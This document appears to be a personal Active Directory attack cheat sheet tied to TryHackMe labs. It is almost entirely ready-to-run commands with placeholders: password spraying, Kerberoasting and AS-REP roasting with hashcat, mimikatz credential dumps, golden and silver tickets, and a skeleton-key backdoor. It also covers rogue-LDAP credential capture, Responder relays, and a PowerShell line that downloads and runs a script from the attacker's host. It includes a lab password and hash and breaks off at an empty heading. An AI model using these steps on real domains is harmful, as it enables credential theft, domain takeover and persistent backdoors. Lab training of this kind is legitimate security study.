# Active Directory

### Kerbrute Installation &#x20;

&#x20;Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute 
```

### Impacket Installation &#x20;

```
wget https://github.com/fortra/impacket/archive/refs/tags/impacket_0_9_19.tar.gz
tar xvf impacket_0_9_19.tar.gz 
cd /root/impacket-impacket_0_9_19
pip install .
```

### Download wordlists

```
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
```





## Information Gathering

**Examples**

[#active-directory-a-d-environment](../../walkthroughs/tryhackme/the-lay-of-the-land.md#active-directory-a-d-environment "mention")

The output of the systeminfo provides information about the machine, including the operating system name and version, hostname, and other hardware information as well as the AD domain.

**Victim(cmd)**

```
systeminfo | findstr Domain
```



## NTLM Authenticated Services

**Examples**

[#ntlm-authenticated-services](../../walkthroughs/tryhackme/breaching-active-directory.md#ntlm-authenticated-services "mention")

**Kali**

```
unzip passwordsprayer.zip 
python /root/Rooms/BreachingAD/task3/ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a "http://ntlmauth.za.tryhackme.com"
```



## Users and Groups Management

Examples

[#users-and-groups-management](../../walkthroughs/tryhackme/the-lay-of-the-land.md#users-and-groups-management "mention")

Use the Get-ADUser -Filter \* -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available?

**Victim(powershell)**

```
 Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"
```







## Enumeration w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist

**Example**

[#enumeration-w-kerbrute](../../walkthroughs/tryhackme/attacking-kerberos.md#enumeration-w-kerbrute "mention")

**Kali**

```
./kerbrute userenum --dc $DOMAINCONTROLLER -d $DOMAIN $USERLIST.txt
```



## Harvesting & Brute-Forcing Tickets w/ Rubeus

**Example**

[#harvesting-and-brute-forcing-tickets-w-rubeus](../../walkthroughs/tryhackme/attacking-kerberos.md#harvesting-and-brute-forcing-tickets-w-rubeus "mention")

Harvest tickets with Rubeus

**Victim**

```
Rubeus.exe harvest /interval:30
```



Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command. This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

**Victim**

```
echo $VICTIM $DOMAINCONTROLLERHOSTNAME >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:$PASSWORD /noticket
```



## Kerberoasting&#x20;

### Kerberoasting #1 - Rubeus&#x20;

**Example**

[#kerberoasting-1-rubeus](../../walkthroughs/tryhackme/attacking-kerberos.md#kerberoasting-1-rubeus "mention")

This will dump the Kerberos hash of any kerberoastable users.

**Victim**

```
Rubeus.exe kerberoast
```

Copy the hashes from the command prompt onto the attacker machine and put it into a .txt file so we can crack it with hashcat. Below command removes all the tabs and formats it properly for hashcat. If you don't format it properly than hashcat will error out.

**Kali**

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g'  > hash.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Hashcat found the passwords for both of the hashes.

```
hashcat -m 13100 -a 0 hash.txt Pass.txt --show
```



### Kerberoasting #2  - Impacket

**Example**

[#kerberoasting-2-impacket](../../walkthroughs/tryhackme/attacking-kerberos.md#kerberoasting-2-impacket "mention")

```
sudo python3.9 /root/test/impacket/examples/GetUserSPNs.py $DOMAINHOSTNAME/$MACHINENAME:$PASSWORD -dc-ip $DCIP -request > hashes.txt
```

Hashes were found for the same two accounts when doing this with Rubeus.

```
hashcat -m 13100 -a 0 hashes.txt Pass.txt
hashcat -m 13100 -a 0 hashes.txt Pass.txt --show
```

## Powershell

**Examples**

[#kerberoasting](../../walkthroughs/tryhackme/corp.md#kerberoasting "mention")

Run the below command from the Administrator account we just got access to.

**Victim(powershell)**

```
setspn -T medin -Q ​ */*
```

<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to Invoke-Kerberoast.ps1 so it runs automatically once downloaded

```
 Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```

**Victim(powershell)**

```
powershell -ep bypass
powershell -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$KALI:81/Invoke-Kerberoast.ps1'))"
```

<figure><img src="../../.gitbook/assets/image (9) (4).png" alt=""><figcaption></figcaption></figure>

Run this to get rid of all the spaces.

**Kali**

```
cat hash.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g' > hash.txt
```

Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

**Kali**

```
hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyo.txt --force
hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt --force --show
```

##

## AS-REP Roasting w/ Rubeus

**Example**

[#as-rep-roasting-w-rubeus](../../walkthroughs/tryhackme/attacking-kerberos.md#as-rep-roasting-w-rubeus "mention")

**Victim**

```
Rubeus.exe asreproast
```

**Kali**

Transfer the hash from the target machine over to kali and put the hash into a txt file. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User... .The below command does the replace and clean up the output so hashcat can recognize the hashes.

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n'| sed 's/$krb5asrep/\n&/g' | sed  's/$krb5asrep/$krb5asrep$23/g'  > hash.txt
hashcat -m 18200 hash.txt Pass.txt
```

Crack hashes

```
hashcat -m 18200 hash.txt Pass.txt --show
```

## Pass the Ticket w/ mimikatz

**Example**

[#pass-the-ticket-w-mimikatz](../../walkthroughs/tryhackme/attacking-kerberos.md#pass-the-ticket-w-mimikatz "mention")

### Prepare Mimikatz & Dump Tickets

**Victim**

```
mimikatz.exe
```

**Victim - Mimikatz**

```
privilege::debug
sekurlsa::tickets /export
```

### Pass the Ticket w/ Mimikatz

Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket. Copy paste one of the kirbi tickets given from the command sekurlsa::tickets /export

**Victim - Mimikatz**

```
kerberos::ptt $TICKET.kirbi
```

Here were just verifying that we successfully impersonated the ticket by listing our cached ticket.

**Victim**

```
klist
```

You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

**Victim**

```
dir \\$VICTIM\admin$
```

## Golden/Silver Ticket Attacks w/ mimikatz

**Examples**

[#golden-silver-ticket-attacks-w-mimikatz](../../walkthroughs/tryhackme/attacking-kerberos.md#golden-silver-ticket-attacks-w-mimikatz "mention")[#golden-ticket-attacks-w-mimikatz](../../walkthroughs/tryhackme/post-exploitation-basics.md#golden-ticket-attacks-w-mimikatz "mention")

**Victim**

```
mimikatz.exe
```

This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

**Victim(Mimikatz)**

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

### Create a Golden/Silver Ticket

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

#### Golden Ticket

This is the command for creating a golden ticket.

**Victim - Mimikatz**

```
Kerberos::golden /user:Administrator /domain:$DOMAINCONTROLLERHOSTNAME /sid:$SID  /krbtgt:$NTLMHASH
```

#### Use the Golden Ticket to access other machine

This will open a new command prompt with elevated privileges to all machines.Access other Machines! - You will now have another command prompt with access to all other machines on the network.&#x20;

**Victim(Mimikatz)**

```
misc::cmd
```

This doesn't actually work. Because of how tryhackme is setup but you would then be able to access other machines. In the example below you'd need to find out what other machines exists to pull this off.

**Victim**

```
dir \\Desktop-1\c$
PsExec.exe \\Desktop-1 cmd.exe
```

#### **Silver Ticket**

This is the command for creating a golden ticket as well but to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into **sid**, and change the id to 1103. &#x20;

**Victim - Mimikatz**

```
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
```

### Use the Golden/Silver Ticket to access other machines

```
misc::cmd
```

NTLM hash of Administrator

```
lsadump::lsa /inject /name:Administrator 
```



## Dumping hashes w/ mimikatz

**Example**

[#dumping-hashes-w-mimikatz](../../walkthroughs/tryhackme/post-exploitation-basics.md#dumping-hashes-w-mimikatz "mention")

**Victim**

```
mimikatz.exe
```

**Victim(Mimikatz)**

```
privilege::debug
lsadump::lsa /patch
```

Copy to Kali output back to Kali

Output only the hashes and remove all duplicates into a new file.

**Kali**

```
cat hashes.txt | grep NTLM | awk -F ":" '{print $2}' | grep "\S" | sed 's/^[ \t]*//'  | sort | uniq > hash.txt
```

<figure><img src="../../.gitbook/assets/image (1) (2) (5) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
```

## Kerberos Backdoors w/ mimikatz

**Example**

[#kerberos-backdoors-w-mimikatz](../../walkthroughs/tryhackme/attacking-kerberos.md#kerberos-backdoors-w-mimikatz "mention")

**Victim**&#x20;

```
mimikatz.exe
```

**Victim (Mimikatz)**

```
privilege::debug
misc::skeleton
```





## LDAP Bind Credentials

**Examples**&#x20;

[#ldap-bind-credentials](../../walkthroughs/tryhackme/breaching-active-directory.md#ldap-bind-credentials "mention")

**Kali**

```
service slapd stop
nc -lvp 389
```

<figure><img src="../../.gitbook/assets/image (9) (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14) (10).png" alt=""><figcaption></figcaption></figure>

### Hosting a Rogue LDAP Server

**Examples**

[#hosting-a-rogue-ldap-server](../../walkthroughs/tryhackme/breaching-active-directory.md#hosting-a-rogue-ldap-server "mention")

**Kali**

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

<figure><img src="../../.gitbook/assets/image (13) (1) (4) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
vi olcSaslSecProps.ldif
```

**olcSaslSecProps.ldif**

```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

* olcSaslSecProps: Specifies the SASL security properties
* noanonymous: Disables mechanisms that support anonymous login
* minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

**Kali**

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

**Before**

<figure><img src="../../.gitbook/assets/image (12) (10).png" alt=""><figcaption></figcaption></figure>

**After**

<figure><img src="../../.gitbook/assets/image (11) (1) (3).png" alt=""><figcaption></figcaption></figure>



## Capturing LDAP Credentials

**Examples**

[#capturing-ldap-credentials](../../walkthroughs/tryhackme/breaching-active-directory.md#capturing-ldap-credentials "mention")

Our rogue LDAP server has now been configured. When we click the "Test Settings" at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx), the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:



<figure><img src="../../.gitbook/assets/image (6) (5) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sudo tcpdump -SX -i breachad tcp port 389
```

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (9).png" alt=""><figcaption></figcaption></figure>



## Authentication Relays

**Examples**

[#authentication-relays](active-directory.md#authentication-relays "mention")

**Kali**

```
sudo service slapd stop
sudo responder -I breachad
```

<figure><img src="../../.gitbook/assets/image (7) (5) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (9) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 5600 hash.txt passwordlist.txt --force 
hashcat -m 5600 hash.txt passwordlist.txt --force --show
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

## Microsoft Deployment Toolkit

**Examples**

[#microsoft-deployment-toolkit](../../walkthroughs/tryhackme/breaching-active-directory.md#microsoft-deployment-toolkit "mention")

**Kali**

```
ssh thm@THMJMP1.za.tryhackme.com
Password: Password1@
```

**Victim**

```
cd Documents
mkdir thm
copy C:\powerpxe thm
cd thm
```

**Victim**

```
tftp -i $THMMDTIP GET "\Tmp\x64{39...28}.bcd" conf.bcd
```

**Victim**

```
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```

**Victim**

```
tftp -i $THMMDTIP  GET "<PXE Boot Image Location>" pxeboot.wim
```

**Victim**

```
Get-FindCredentials -WimFile pxeboot.wim
```

## C

































